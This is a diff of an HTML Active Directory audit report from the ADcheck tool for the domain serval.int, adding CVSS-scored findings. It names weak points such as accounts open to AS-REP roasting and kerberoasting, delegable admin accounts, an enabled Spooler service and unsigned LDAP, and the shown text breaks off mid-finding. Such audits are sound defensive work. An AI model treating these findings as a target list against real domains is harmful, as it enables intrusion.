@@ -4,274 +4,1134 @@
   <meta charset="UTF-8">
   <title>ADcheck Report - serval.int</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-      font-family: 'Roboto', sans-serif;
-      background-color: white;
-      color: #222;
-      display: flex;
-      flex-direction: column;
-    }
+    :root { --ink:#1e2a38; --muted:#5a6b7b; }
+    html, body { height:100%; margin:0; font-family:'Roboto',sans-serif; background:#f4f6f8; color:#222; display:flex; flex-direction:column; }
+    header { background:linear-gradient(90deg,#1e2a38,#2f3e4d); color:#fff; padding:1.5em 2em; text-align:center; }
+    header h1 { margin:0; font-size:1.8em; }
+    header p { margin:.5em 0 0; font-size:.95em; color:#ccc; }
+    .container { padding:2em; max-width:1200px; margin:auto; flex:1; width:100%; box-sizing:border-box; }
 
-    header {
-      background: linear-gradient(90deg, #1e2a38, #2f3e4d);
-      color: white;
-      padding: 1.5em 2em;
-      text-align: center;
-    }
+    /* summary banner */
+    .summary-banner { display:flex; flex-wrap:wrap; gap:1.5em; margin-bottom:2em; }
+    .gauge { flex:0 0 200px; background:#fff; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,.08); padding:1.5em; text-align:center; }
+    .gauge .score { font-size:3em; font-weight:700; line-height:1; }
+    .gauge .score small { font-size:.35em; font-weight:400; color:#888; }
+    .gauge .label { margin-top:.4em; color:#555; font-size:.9em; }
+    .score-good{color:#2a9d8f}.score-fair{color:#e9c46a}.score-poor{color:#f4a261}.score-bad{color:#c93131}
 
-    header h1 {
-      margin: 0;
-      font-size: 1.8em;
-    }
+    .sev-cards { flex:1 1 400px; display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:1em; }
+    .sev-card { background:#fff; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,.08); padding:1em; text-align:center; border-top:4px solid #ccc; cursor:pointer; transition:transform .15s,box-shadow .15s; }
+    .sev-card:hover { transform:translateY(-2px); box-shadow:0 4px 14px rgba(0,0,0,.14); }
+    .sev-card.active { outline:3px solid var(--ink); outline-offset:2px; }
+    .sev-card .count { font-size:2em; font-weight:700; }
+    .sev-card .name { font-size:.85em; color:#555; text-transform:uppercase; letter-spacing:.5px; }
+    .sev-card.all  { border-top-color:#1e2a38; } .sev-card.all .count{color:#1e2a38}
+    .sev-card.crit { border-top-color:#7b0d0d; } .sev-card.crit .count{color:#7b0d0d}
+    .sev-card.high { border-top-color:#c93131; } .sev-card.high .count{color:#c93131}
+    .sev-card.med  { border-top-color:#f4a261; } .sev-card.med .count{color:#f4a261}
+    .sev-card.low  { border-top-color:#4a90d9; } .sev-card.low .count{color:#4a90d9}
 
-    header p {
-      margin: 0.5em 0 0;
-      font-size: 0.95em;
-      color: #ccc;
-    }
+    h2.block-title { color:var(--ink); margin:1.5em 0 .3em; }
+    .hint { color:var(--muted); font-size:.9em; margin:0 0 1em; }
 
-    .container {
-      padding: 2em;
-      max-width: 1200px;
-      margin: auto;
-      flex: 1;
-      width: 100%;
-    }
+    /* category groups */
+    .cat-group { background:#fff; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,.08); margin-bottom:1.2em; overflow:hidden; }
+    .cat-head { display:flex; align-items:center; gap:.7em; padding:.9em 1.2em; background:#f0f3f6; border-left:6px solid #ccc; cursor:pointer; user-select:none; }
+    .cat-head:hover { background:#e9eef3; }
+    .cat-head .cat-toggle { font-size:1.1em; color:var(--muted); transition:transform .2s; width:1em; display:inline-block; }
+    .cat-group.collapsed .cat-toggle { transform:rotate(-90deg); }
+    .cat-head .cat-title { font-weight:700; color:var(--ink); font-size:1.05em; }
+    .cat-head .cat-count { color:var(--muted); font-size:.85em; }
+    .cat-group.crit .cat-head{border-left-color:#7b0d0d}.cat-group.high .cat-head{border-left-color:#c93131}
+    .cat-group.med .cat-head{border-left-color:#f4a261}.cat-group.low .cat-head{border-left-color:#4a90d9}
+    .cat-group.ok .cat-head{border-left-color:#2a9d8f}
+    .cat-body { display:block; }
+    .cat-group.collapsed .cat-body { display:none; }
 
-    .cards {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 1.5em;
-    }
+    .finding-row { display:flex; align-items:center; gap:1em; padding:.7em 1.2em; border-top:1px solid #eee; cursor:pointer; transition:background .12s; }
+    .finding-row:hover { background:#f6f9fc; }
+    .finding-row .msg { flex:1; }
+    .finding-row .msg .vector { display:block; margin-top:3px; font-size:.72em; color:var(--muted); background:#eef1f4; padding:1px 6px; border-radius:4px; font-family:Consolas,Menlo,monospace; word-break:break-all; width:fit-content; }
+    .finding-row .chev { color:#bbb; font-size:1.2em; }
 
-    .card {
-      border-radius: 12px;
-      padding: 1.5em;
-      cursor: pointer;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      transition: transform 0.2s;
-      background-color: white;
-    }
+    .badge { display:inline-block; min-width:42px; text-align:center; padding:3px 8px; border-radius:6px; font-weight:700; color:#fff; font-size:.85em; }
+    .sev-critical{background:#7b0d0d}.sev-high{background:#c93131}.sev-medium{background:#f4a261;color:#3a2400}.sev-low{background:#4a90d9}.sev-none{background:#2a9d8f}
+    .sev-pill { display:inline-block; padding:1px 8px; border-radius:10px; font-size:.72em; font-weight:600; text-transform:uppercase; letter-spacing:.4px; }
 
-    .card:hover {
-      transform: scale(1.02);
-    }
+    .empty { padding:1.2em; color:#2a9d8f; }
+    .data-table { width:100%; border-collapse:collapse; font-size:.88em; margin:.8em 0 1em; }
+    .data-table th { background:#f0f3f6; color:var(--ink); text-align:left; padding:.5em .8em; border-bottom:2px solid #d0d9e2; font-weight:600; }
+    .data-table td { padding:.45em .8em; border-bottom:1px solid #eee; vertical-align:top; word-break:break-word; }
+    .data-table tr:last-child td { border-bottom:none; }
+    .section-label { display:flex; align-items:center; gap:.4em; font-size:.72em; font-weight:700; text-transform:uppercase; letter-spacing:.6px; padding:.5em 1.2em; border-top:2px solid #dee4ed; }
+    .section-label.first { border-top:none; }
+    .section-label.lbl-failed { background:#fdf0f0; border-top-color:#f0c0c0; color:#8b1a1a; }
+    .section-label.lbl-passed { background:#f0faf5; border-top-color:#b0dfc8; color:#1a6b3a; }
+    .section-label.lbl-info   { background:#eef3fb; border-top-color:#b0c8e8; color:#1a3a6b; }
+    .finding-row.row-static { cursor:default; }
+    .finding-row.row-static:hover { background:transparent; }
+    .info-item { padding:.55em 1.2em .7em; border-top:1px solid #eee; }
+    .info-head { display:flex; align-items:center; gap:.7em; margin-bottom:.1em; }
+    .badge-info { background:#5a6b7b; }
+    pre.info-pre { background:#11161c; color:#e6edf3; padding:.9em 1em; border-radius:8px; overflow-x:auto; font-size:.8em; line-height:1.5; margin:.4em 0 0 3.5em; white-space:pre-wrap; word-break:break-word; }
+    .info-item .table-title { font-size:.8em; font-weight:700; text-transform:uppercase; letter-spacing:.5px; color:var(--muted); margin:.1em 0 .3em; }
 
-    .card h3 {
-      margin-top: 0;
-      font-size: 1.2em;
-    }
+    /* slide-in detail panel */
+    .overlay { position:fixed; inset:0; background:rgba(0,0,0,.35); opacity:0; pointer-events:none; transition:opacity .2s; z-index:40; }
+    .overlay.open { opacity:1; pointer-events:auto; }
+    .panel { position:fixed; top:0; right:0; height:100%; width:min(560px,92vw); background:#fff; box-shadow:-4px 0 24px rgba(0,0,0,.2); transform:translateX(100%); transition:transform .25s; z-index:50; display:flex; flex-direction:column; }
+    .panel.open { transform:translateX(0); }
+    .panel-head { padding:1.3em 1.5em; background:linear-gradient(90deg,#1e2a38,#2f3e4d); color:#fff; }
+    .panel-head .ph-top { display:flex; align-items:center; gap:.6em; margin-bottom:.6em; }
+    .panel-head h3 { margin:0; font-size:1.15em; line-height:1.35; }
+    .panel-close { position:absolute; top:1.1em; right:1.2em; background:transparent; border:none; color:#fff; font-size:1.6em; cursor:pointer; line-height:1; }
+    .panel-body { padding:1.5em; overflow-y:auto; }
+    .field { margin-bottom:1.4em; }
+    .field .k { font-size:.75em; text-transform:uppercase; letter-spacing:.6px; color:var(--muted); font-weight:600; margin-bottom:.35em; }
+    .field .v { font-size:.97em; line-height:1.5; }
+    .field .state { display:inline-block; padding:2px 10px; border-radius:6px; background:#fce8e8; color:#c93131; font-weight:700; font-size:.85em; }
+    .field pre { background:#11161c; color:#e6edf3; padding:.9em 1em; border-radius:8px; overflow-x:auto; font-size:.82em; line-height:1.5; margin:0; white-space:pre-wrap; word-break:break-word; }
+    .field code.inl { background:#eef1f4; padding:1px 6px; border-radius:4px; font-family:Consolas,Menlo,monospace; font-size:.8em; word-break:break-all; }
+    .field a { color:#1f6feb; word-break:break-all; }
+    .copy-btn { float:right; background:#2f3e4d; color:#fff; border:none; border-radius:5px; padding:3px 9px; font-size:.75em; cursor:pointer; }
 
-    .score {
-      font-size: 2em;
-      font-weight: bold;
-    }
-
-    .score.red { color: #c93131; }
-    .score.orange { color: #f4a261; }
-    .score.yellow { color: #e9c46a; }
-    .score.green { color: #2a9d8f; }
-
-    .hidden {
-      display: none;
-    }
-
-    .detail-view {
-      padding: 2em;
-    }
-
-    .detail-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .back-btn {
-      padding: 0.5em 1em;
-      background-color: #1e2a38;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-
-    .check-list {
-      margin-top: 2em;
-    }
-
-    .check-text {
-      margin-bottom: 0.8em;
-      white-space: pre-wrap;
-      word-break: break-word;
-    }
-
-    .green-text { color: #26b260; }
-    .red-text { color: #c93131; }
-    .black-text { color: #1e2a38; }
-
-    summary {
-      cursor: pointer;
-      font-weight: 600;
-      margin-top: 2em;
-    }
-
-    footer {
-      background: #1e2a38;
-      color: #ccc;
-      text-align: center;
-      padding: 1.2em;
-      font-size: 0.85em;
-    }
-
-    footer a {
-      color: #4fd1c5;
-      text-decoration: none;
-    }
-
-    footer strong {
-      color: #4fd1c5;
-    }
-
-    @media (max-width: 768px) {
-      .detail-header {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 1em;
-      }
-    }
+    .toggle-btn { display:inline-flex; align-items:center; gap:.35em; padding:.3em .85em; border-radius:6px; border:1px solid #c8d3dc; background:#fff; color:var(--ink); font-size:.82em; font-weight:600; cursor:pointer; text-decoration:none; transition:background .15s,border-color .15s; }
+    .toggle-btn:hover { background:#eef1f4; border-color:#a0b0bc; }
+    .toggle-btn svg { width:12px; height:12px; stroke:currentColor; fill:none; stroke-width:2.5; }
+    .toggle-bar { display:flex; gap:.6em; margin-bottom:1em; }
+    footer { background:#1e2a38; color:#ccc; text-align:center; padding:1.2em; font-size:.85em; }
+    footer a, footer strong { color:#4fd1c5; text-decoration:none; }
   </style>
 </head>
 <body>
 
 <header>
   <h1>ADcheck Report – serval.int</h1>
-  <p>Date : 2025-06-04 14:33:52</p>
+  <p>Date : 2026-07-08 18:45:09</p>
 </header>
 
 <div class="container">
 
-  <div id="summary-view">
-    <h2 style="text-align:center; margin-bottom: 1.5em;">Global Score :
-      <span class="score orange">
-        44%
-      </span>
-    </h2>
+  
 
-    <div class="cards">
-      <div class="card" onclick="showDetail('privs')">
-        <h3>Privilege and Trust Management</h3>
-        <div class="score green">80%</div>
-      </div>
-      <div class="card" onclick="showDetail('user')">
-        <h3>User Account Management</h3>
-        <div class="score yellow">64%</div>
-      </div>
-      <div class="card" onclick="showDetail('domain')">
-        <h3>Computer and Domain Management</h3>
-        <div class="score red">24%</div>
-      </div>
-      <div class="card" onclick="showDetail('policy')">
-        <h3>Audit and Policy Management</h3>
-        <div class="score orange">30%</div>
-      </div>
+  <div class="summary-banner">
+    <div class="gauge">
+      <div class="score score-poor">42<small>/100</small></div>
+      <div class="label">CVSS-weighted posture</div>
+      <div class="label" style="margin-top:.6em;">Avg CVSS : <strong>5.8</strong></div>
+      <div class="label">Failed checks : <strong>40</strong></div>
+    </div>
+    <div class="sev-cards">
+      <div class="sev-card all active" data-sev="all" onclick="filterSev('all',this)"><div class="count">40</div><div class="name">All</div></div>
+      <div class="sev-card crit" data-sev="Critical" onclick="filterSev('Critical',this)"><div class="count">0</div><div class="name">Critical</div></div>
+      <div class="sev-card high" data-sev="High" onclick="filterSev('High',this)"><div class="count">14</div><div class="name">High</div></div>
+      <div class="sev-card med" data-sev="Medium" onclick="filterSev('Medium',this)"><div class="count">17</div><div class="name">Medium</div></div>
+      <div class="sev-card low" data-sev="Low" onclick="filterSev('Low',this)"><div class="count">9</div><div class="name">Low</div></div>
     </div>
   </div>
 
-  <div id="detail-view" class="hidden">
-    <div class="detail-header">
-      <h2 id="detail-title"></h2>
-      <button class="back-btn" onclick="goBack()">← Retour</button>
+  <h2 class="block-title">Findings by category</h2>
+  <div class="toggle-bar">
+    <a href="#" class="toggle-btn" onclick="toggleAll(true);return false;"><svg viewBox="0 0 12 12"><path d="M2 4l4 4 4-4"/></svg>Collapse all</a>
+    <a href="#" class="toggle-btn" onclick="toggleAll(false);return false;"><svg viewBox="0 0 12 12"><path d="M2 8l4-4 4 4"/></svg>Expand all</a>
+  </div>
+
+  <div id="cat-container">
+  
+  
+  <div class="cat-group high" data-category="Computer and Domain Management">
+    <div class="cat-head" onclick="toggleCat(this)">
+      <span class="cat-toggle">▾</span>
+      <span class="cat-title">Computer and Domain Management</span>
+      <span class="cat-count">— 10 failed, 4 passed, 6 info
+      </span>
     </div>
-
-    <details open>
-      <summary>❌ Ko</summary>
-      <div id="red-list" class="check-list"></div>
-    </details>
-
-    <details>
-      <summary>✅ Ok</summary>
-      <div id="green-list" class="check-list"></div>
-    </details>
-
-    <details>
-      <summary>ℹ️ Info</summary>
-      <div id="black-list" class="check-list"></div>
-    </details>
+    <div class="cat-body">
+    
+    <div class="section-label lbl-failed first">✗ Failed checks</div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(0, "Computer and Domain Management")'>
+      <span class="badge sev-high">8.8</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        Spooler service is enabled on remote target : True
+        <span class="vector">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(1, "Computer and Domain Management")'>
+      <span class="badge sev-high">8.2</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        The computer is up to date (Last : 10/21/2023) : False
+        <span class="vector">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(2, "Computer and Domain Management")'>
+      <span class="badge sev-high">8.2</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        LAPS is installed : False
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(3, "Computer and Domain Management")'>
+      <span class="badge sev-high">8.1</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        LDAP signature was required on target : False
+        <span class="vector">CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(4, "Computer and Domain Management")'>
+      <span class="badge sev-high">7.7</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        Kerberos password last changed : 824 day(s) ago
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(5, "Computer and Domain Management")'>
+      <span class="badge sev-medium">5.9</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Non-admin users can add up to 10 computer(s) to a domain
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(6, "Computer and Domain Management")'>
+      <span class="badge sev-medium">4.2</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Supported encryption by Domain Controllers : 
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(7, "Computer and Domain Management")'>
+      <span class="badge sev-medium">4.2</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Supported Kerberos encryption algorithms : RC4_HMAC_MD5
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Low" onclick='openPanel(8, "Computer and Domain Management")'>
+      <span class="badge sev-low">2.5</span>
+      <span class="sev-pill sev-low">Low</span>
+      <span class="msg">
+        The computer was never backed up
+        <span class="vector">CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Low" onclick='openPanel(9, "Computer and Domain Management")'>
+      <span class="badge sev-low">2.2</span>
+      <span class="sev-pill sev-low">Low</span>
+      <span class="msg">
+        Recycle Bin is enabled : False
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:L</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    
+    
+    <div class="section-label lbl-passed">✓ Passed checks</div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">SMB signing is required : True</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">LDAPS not configured on target</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Ldap anonymous bind : False</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">DFSR SYSVOL is enabled : True</span>
+    </div>
+    
+    
+    
+    <div class="section-label lbl-info">ℹ Info</div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Password Settings Object :</span>
+      </div>
+      
+      <pre class="info-pre">[]</pre>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Kerberos config :</span>
+      </div>
+      
+      <pre class="info-pre">{
+    "MaxTicketAge": "10",
+    "MaxRenewAge": "7",
+    "MaxServiceAge": "600",
+    "MaxClockSkew": "5",
+    "TicketValidateClient": "1"
+}</pre>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Functional level of domain is : Windows Server 2016</span>
+      </div>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Domain Controllers: ['SRV-DC01$']</span>
+      </div>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Computers with bitlocker keys : []</span>
+      </div>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">List of Named pipes :</span>
+      </div>
+      
+      <pre class="info-pre">[
+    "\\pipe\\76d28646505d36d0",
+    "\\pipe\\Ctx_WinStation_API_service",
+    "\\pipe\\InitShutdown",
+    "\\pipe\\LSM_API_service",
+    "\\pipe\\PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER",
+    "\\pipe\\ROUTER",
+    "\\pipe\\RpcProxy\\50506",
+    "\\pipe\\RpcProxy\\593",
+    "\\pipe\\SessEnvPublicRpc",
+    "\\pipe\\TermSrv_API_service",
+    "\\pipe\\W32TIME_ALT",
+    "\\pipe\\Winsock2\\CatalogChangeListener-220-0",
+    "\\pipe\\Winsock2\\CatalogChangeListener-2a4-0",
+    "\\pipe\\Winsock2\\CatalogChangeListener-2b8-0",
+    "\\pipe\\Winsock2\\CatalogChangeListener-2b8-1",
+    "\\pipe\\Winsock2\\CatalogChangeListener-2c8-0",
+    "\\pipe\\Winsock2\\CatalogChangeListener-378-0",
+    "\\pipe\\Winsock2\\CatalogChangeListener-3a8-0",
+    "\\pipe\\Winsock2\\CatalogChangeListener-550-0",
+    "\\pipe\\Winsock2\\CatalogChangeListener-a94-0",
+    "\\pipe\\Winsock2\\CatalogChangeListener-adc-0",
+    "\\pipe\\Winsock2\\CatalogChangeListener-af4-0",
+    "\\pipe\\atsvc",
+    "\\pipe\\epmapper",
+    "\\pipe\\eventlog",
+    "\\pipe\\lsass",
+    "\\pipe\\netdfs",
+    "\\pipe\\ntsvcs",
+    "\\pipe\\scerpc",
+    "\\pipe\\spoolss",
+    "\\pipe\\srvsvc",
+    "\\pipe\\vgauth-service",
+    "\\pipe\\winreg",
+    "\\pipe\\wkssvc"
+]</pre>
+      
+    </div>
+    
+    
+    
+    </div>
+  </div>
+  
+  
+  <div class="cat-group high" data-category="User Account Management">
+    <div class="cat-head" onclick="toggleCat(this)">
+      <span class="cat-toggle">▾</span>
+      <span class="cat-title">User Account Management</span>
+      <span class="cat-count">— 10 failed, 7 passed, 3 info
+      </span>
+    </div>
+    <div class="cat-body">
+    
+    <div class="section-label lbl-failed first">✗ Failed checks</div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(0, "User Account Management")'>
+      <span class="badge sev-high">8.8</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        Admin accounts that can be delegated : ['Administrator', 'jbower']
+        <span class="vector">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(1, "User Account Management")'>
+      <span class="badge sev-high">8.1</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        Number of accounts with identical password : 3
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(2, "User Account Management")'>
+      <span class="badge sev-high">7.7</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        Accounts in Schema Admins group : ['Administrator']
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(3, "User Account Management")'>
+      <span class="badge sev-high">7.4</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        Accounts vulnerable to asreproasting attack : ['jbower']
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(4, "User Account Management")'>
+      <span class="badge sev-medium">6.8</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Accounts vulnerable to kerberoasting attack : ['test']
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(5, "User Account Management")'>
+      <span class="badge sev-medium">6.8</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Admin accounts not in Protected Users group : ['Administrator']
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(6, "User Account Management")'>
+      <span class="badge sev-medium">6.5</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Pre-Windows 2000 Compatible Access group members contain "Authenticated Users : True
+        <span class="vector">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(7, "User Account Management")'>
+      <span class="badge sev-medium">5.4</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        The native administrator account has been used recently : 0 day(s) ago
+        <span class="vector">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(8, "User Account Management")'>
+      <span class="badge sev-medium">4.2</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Accounts that were an admin : ['Administrator', 'jbower']
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Low" onclick='openPanel(9, "User Account Management")'>
+      <span class="badge sev-low">3.7</span>
+      <span class="sev-pill sev-low">Low</span>
+      <span class="msg">
+        Number of inactive accounts: 2
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    
+    
+    <div class="section-label lbl-passed">✓ Passed checks</div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Accounts vulnerable to timeroasting attack : []</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Accounts which have reversible passwords : []</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Accounts with password not required : []</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Locked accounts : []</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Accounts which can use des authentication : []</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Number of accounts which have never expiring passwords : 4</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Accounts with blank password : []</span>
+    </div>
+    
+    
+    
+    <div class="section-label lbl-info">ℹ Info</div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Summary of sensitive attributes:</span>
+      </div>
+      
+      <pre class="info-pre">{
+    "altSecurityIdentities": [],
+    "userPassword": [],
+    "unixUserPassword": [],
+    "unicodePwd": [],
+    "msDS-HostServiceAccount": []
+}</pre>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Group Managed Service Accounts : []</span>
+      </div>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Users with description : 0</span>
+      </div>
+      
+    </div>
+    
+    
+    
+    </div>
+  </div>
+  
+  
+  <div class="cat-group high" data-category="Audit and Policy Management">
+    <div class="cat-head" onclick="toggleCat(this)">
+      <span class="cat-toggle">▾</span>
+      <span class="cat-title">Audit and Policy Management</span>
+      <span class="cat-count">— 19 failed, 9 passed, 2 info, 1 table(s)
+      </span>
+    </div>
+    <div class="cat-body">
+    
+    <div class="section-label lbl-failed first">✗ Failed checks</div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(0, "Audit and Policy Management")'>
+      <span class="badge sev-high">8.1</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        RDP is secured over pass the hash attack : False
+        <span class="vector">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(1, "Audit and Policy Management")'>
+      <span class="badge sev-high">8.0</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        WSUS server is not used
+        <span class="vector">CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(2, "Audit and Policy Management")'>
+      <span class="badge sev-high">7.1</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        LLMNR, NetBIOS or mDNS is disabled : False
+        <span class="vector">CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(3, "Audit and Policy Management")'>
+      <span class="badge sev-high">7.1</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        WPAD is disabled : False
